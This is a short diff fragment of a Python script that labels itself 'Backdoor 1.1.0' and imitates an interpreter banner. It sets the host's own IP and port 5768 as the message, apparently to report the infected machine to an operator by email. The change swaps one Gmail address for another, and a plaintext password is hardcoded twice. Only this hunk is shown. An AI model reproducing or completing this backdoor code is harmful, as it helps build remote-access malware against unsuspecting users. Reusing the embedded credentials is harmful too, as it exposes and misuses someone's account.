@@ -21,7 +21,7 @@ print('Backdoor 1.1.0 [MSC v.2021 64 bit(AMD64)] on win32' + '\n' + 'Type "help"
 #Paths
 HOST = socket.gethostbyname(socket.gethostname())
 PORT = 5768
-email = 'shopapps36@gmail.com'
+email = 'programming.developcode@gmail.com'
 psw = 'pavel08180919'
 message = HOST
 pwd = 'pavel08180919'
